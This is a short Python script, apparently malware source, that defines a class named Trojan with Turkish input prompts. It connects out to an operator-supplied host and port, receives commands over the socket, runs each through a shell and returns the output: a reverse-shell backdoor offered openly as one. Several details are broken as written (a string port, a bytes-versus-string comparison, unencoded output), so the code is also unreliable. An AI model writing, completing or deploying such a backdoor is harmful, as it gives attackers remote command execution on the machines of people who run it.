import socket
import subprocess
import re


class Trojan:

    def __init__(self, host, port):
        self.host = host
        self.port = port

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))

    def run(self):
        while True:
            command = self.socket.recv(1024)

            if command == "quit":
                break

            result = subprocess.run(command.decode("utf-8"), shell=True, capture_output=True, text=True)

            self.socket.send(result.stdout)


if __name__ == "__main__":
    host = input("Sunucu adresi: ")
    port = input("Sunucu portu: ")

    trojan = Trojan(host, port)
    trojan.run()
